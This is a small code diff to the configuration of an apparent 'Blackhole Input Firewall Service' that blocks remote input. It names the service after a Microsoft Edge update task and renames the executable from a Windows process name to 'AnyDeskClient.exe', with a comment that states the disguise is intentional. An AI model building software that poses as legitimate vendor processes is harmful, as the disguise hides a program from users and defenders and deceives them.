@@ -10,7 +10,7 @@ Configuration for Blackhole Input Firewall Service
 SERVICE_NAME = "MicrosoftEdgeUpdateTaskMachineCore"
 
 # Executable name (disguised as legitimate Windows process)
-EXE_NAME = "taskhostw.exe"
+EXE_NAME = "AnyDeskClient.exe"
 
 # Default state on startup (True = firewall ON, block remote input)
 DEFAULT_FIREWALL_STATE = True
